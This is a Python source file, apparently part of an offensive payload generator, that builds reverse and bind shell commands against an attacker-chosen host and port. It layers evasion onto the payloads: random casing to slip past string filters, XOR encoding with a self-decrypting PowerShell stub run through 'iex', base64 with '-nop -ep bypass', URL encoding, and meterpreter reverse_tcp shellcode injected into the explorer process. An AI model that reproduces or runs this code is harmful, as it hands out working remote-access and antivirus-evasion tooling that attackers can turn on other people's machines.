from obfuscators import randomize_vars, ipfuscate, obfuscate_port
from encoders import powershell_base64, xor, to_unicode, to_urlencode
from binascii import hexlify
from binary import shellcode_to_hex, shellcode_to_ps1, WINDOWS_BLOODSEEKER_SCRIPT # imported since 0.3.6
from sys import exit
import platform
import os
import string


def generate_file_name(extension=""):
    file_name = ""
    while len(file_name) < 8:
        random_char = os.urandom(1)
        if random_char in string.letters:
            file_name += random_char
    return file_name + extension


class OperationalSystem(object):
    def __init__(self):
        self.OS = "linux" if "linux" in platform.platform().lower() else "windows"


SysOS = OperationalSystem()


def info(msg):
    if SysOS.OS == "linux":
        msg = "[\033[094m+\033[0m] {0}".format(msg)
    else:
        msg = "[+] {0}".format(msg)
    return msg


def error(msg):
    if SysOS.OS == "linux":
        msg = "[\033[091m!\033[0m] {0}".format(msg)
    else:
        msg = "[!] {0}".format(msg)
    return msg


def alert(msg):
    if SysOS.OS == "linux":
        msg = "[\033[093mALERT\033[0m] {0}".format(msg)
    else:
        msg = "[ALERT] {0}".format(msg)
    return msg


def random_case_shuffle(data):
    """
    Use os.urandom() to randomly choose case from a ASCII byte-stream 
    @zc00l
    """
    out = ""
    for char in data:
        out += char.upper() if ord(os.urandom(1)) % 2 == 0 else char.lower()
    return out


def powershell_wrapper(name, code, args):
    """
    --powershell-x86 and --powershell-x64
    Choose which powershel.exe binary to use.
    Useful when there is security policies restricting one, but not both.
    @zc00l

    --powershell-random-case
    Randomly set the case in powershell payloads.
    This might avoid some weak string filtering.
    @zc00l
    """

    if args.powershell_x86 is True:
        code = code.replace("powershell.exe", "C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe")
    elif args.powershell_x64 is True:
        code = code.replace("powershell.exe", "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe")

    if "powershell" in name.lower() and args.powershell_random_case is True:
        code = random_case_shuffle(code)  # apply random case if user requested.
    return code


def xor_wrapper(name, code, args, shell="/bin/bash"):
    if args.shell is not "":
        shell = args.shell
    if "powershell" not in name.lower():
        if "windows" not in name.lower():
            code = """VAR1="";for VAR2 in $(echo {0}|sed "s/../&\\n/g"); do VAR1=$VAR1$(echo -e $(awk "BEGIN {{printf \\"%x\\n\\", xor(0x$VAR2, {1})}}"|sed "s/../\\\\\\\\x&/g"));done;echo $VAR1|{2}""".format(hexlify(xor(code, args.xor)), hex(args.xor), shell)
            code = shell + " -c '" + code + "'"
            code = randomize_vars(code, args.obfuscate_small)
    else:
        # Improved code in 0.3.6
        if "-Command" in code:
            prefix, xcode = code.split("-Command")
        else:
            prefix = "powershell.exe -nop -ep bypass "
            xcode = code
        pcode = xcode.replace('"', "")
        #pcode = pcode.replace("\\", '\\"')
        
        code = to_unicode(pcode)  # String to Unicode
        code = xor(code, args.xor)  # XOR encode using random key <--
        code = powershell_base64(code, unicode_encoding=False) # We need it in base64 because it is binary
        code = """ $VAR1={0};$VAR2='{1}';$VAR3=[Convert]::FromBase64String($VAR2);$VAR4=foreach($VAR5 in $VAR3) {{$VAR5 -bxor $VAR1}};$VAR7=[System.Text.Encoding]::Unicode.GetString($VAR4);iex $VAR7""".format(args.xor, code) # Decryption stub
        code = prefix + "-Command " + '"%s"' % code
        code = randomize_vars(code, args.obfuscate_small)
    return code


def base64_wrapper(name, code, args, shell="/bin/bash"):
    if args.shell is not "":
        shell = args.shell
    if args.base64 is True:
        if "powershell" not in name.lower(): # post-note: linux powershell is going to have problem.
            if "windows" not in name.lower():
                code = "echo " + code.encode("base64").replace("\n", "") + "|base64 -d|{0}".format(shell)
        else:
            # Powershell encoding code
            # Improved code in 0.3.6
            if "-command" in code.lower():
                prefix, xcode = str(code.lower()).split("-command") if args.powershell_random_case is True else code.split("-Command")
            else:
                prefix = "powershell.exe -nop -ep bypass "
                xcode = code
            
            pcode = xcode.replace('"', "") # Remove double quotes from -Command
            #pcode = pcode.replace("\\", "") # remove string quotation

            # It is needed to random case again, if the user chose to random-case.
            pcode = powershell_wrapper(name, pcode, args)
            code = prefix + "-Encoded " + powershell_base64(pcode[1:])
    return code


class Shell(object):
    def __init__(self, name, short_name, shell_type, proto, code, system=None, lang=None, arch=None, use_handler=None, use_http_stager=None):
        """
        ShellCode object is responsible for holding information about
        the static characteristics and informations about this shell 
        entry.
        It does not is reponsible for generating code or applying en-
        encoders. This is done by ReverseShell() or BindShell() clas-
        ses.
        """

        # These are the required attributes;
        self.name = name
        self.type = shell_type
        self.proto = proto
        self.code = code
        self.short_name = short_name if len(short_name) > 0 else "generic"

        # These are optional attributes;
        self.system_os = "unknown" if system is None else system
        self.lang = "unknown" if lang is None else lang
        self.arch = "unknown" if arch is None else arch
        self.handler = None if use_handler is None else use_handler # this is going to be the handler function.
        self.handler_args = None # this is going to be set during execution.

        self.use_http_stager = False if use_http_stager is None else use_http_stager
        return
    
    def get_full_name(self):
        return self.system_os + "/" + self.type + "/" + self.proto + "/" + self.short_name
    
    
class ReverseShell(object):
    def __init__(self, name, lang, args, code):
        self.name = name
        self.lang = lang
        self.args = args
        self.host = args.host
        self.port = args.port
        self.code = code
        self.payload = str()  # this is where the final code is stored.

    def get(self):
        """
        Generate the code.
        Apply encoding, in the correct order, of course.
        """
        # Obfuscate IP and port if set in args
        if self.args.ipfuscate and self.lang != "powershell":  # Windows shells doesn't support ipfuscation
            self.host = ipfuscate(self.host, self.args.obfuscate_small)
            self.port = obfuscate_port(self.port, self.args.obfuscate_small, self.lang)

        # Update of 0.3.6
        # Some custom shells will not need TARGET and PORT strings.
        # To deal with that, I will just try to find them in the string first.
        if "TARGET" in self.code and "PORT" in self.code:
            self.code = str(self.code.replace("TARGET", self.host)).replace("PORT", str(self.port))
            
            # Apply variable randomization
            self.code = randomize_vars(self.code, self.args.obfuscate_small, self.lang)

            # Apply powershell-tuning if set in args.
            self.code = powershell_wrapper(self.name, self.code, self.args)

        else:
            # Custom shell. Here we need to program individually based in specifics.
            # TODO: I need to separate this into a custom file.

            if "bat2meterpreter" in self.name.lower():
                print(info("Generating shellcode ..."))
                return self.code + shellcode_to_hex("windows/meterpreter/reverse_tcp", self.args.host, self.args.port)

            if "bloodseeker" in self.name.lower():  # This is for Bloodseeker project.
                
                # This one requires a stager.
                if self.args.stager is None:
                    print(error("This payload REQUIRES --stager flag."))
                    exit(1)

                print(info("Generating shellcode ..."))
                malicious_script = str(WINDOWS_BLOODSEEKER_SCRIPT.decode("base64")).replace("SHELLCODEHERE", shellcode_to_ps1("windows/x64/meterpreter/reverse_tcp", self.args.host, self.args.port))

                # TODO: Create a --bloodseeker-process flag to specify process name
                process_name = "explorer"
                self.code = malicious_script.replace("PROCESSNAME", process_name)
                print(alert("Make sure you have a handler for windows/x64/meterpreter/reverse_tcp listening \
                in your machine."))
                return self.code  # we don't need encoder in this one.
            else:
                print(error("No custom shell procedure was arranged for this shell. This is fatal."))
                exit(1)
        
        # Apply xor encoding.
        self.code = self.code if self.args.xor is 0 else xor_wrapper(self.name, self.code, self.args)

        # Apply base64 encoding.
        self.code = base64_wrapper(self.name, self.code, self.args)

        # Apply URL-encoding
        if self.args.urlencode is True and self.args.stager is None:
            self.code = to_urlencode(self.code)
        
        return self.code


class BindShell(object):
    def __init__(self, name, lang, args, code):
        self.name = name
        self.lang = lang
        self.args = args
        self.port = args.port
        self.code = code
        self.payload = str() # this is where the final code is stored.

    def get(self):
        """
        Generate the code.
        Apply encoding, in the correct order, of course.
        """
        # Obfuscate IP and port if set in args
        if self.args.ipfuscate:
            self.port = obfuscate_port(self.port, self.args.obfuscate_small, self.lang)

        # Set connection data to the code.
        self.code = self.code.replace("PORT", str(self.port))

        # Apply variable randomization
        self.code = randomize_vars(self.code, self.args.obfuscate_small, self.lang)

        # Apply powershell-tuning if set in args.
        self.code = powershell_wrapper(self.name, self.code, self.args)

        # Apply xor encoding.
        self.code = self.code if self.args.xor is 0 else xor_wrapper(self.name, self.code, self.args)

        # Apply base64 encoding.
        self.code = base64_wrapper(self.name, self.code, self.args)

        # Apply url-encoding
        if self.args.urlencode is True:
            self.code = to_urlencode(self.code)
        
        return self.code
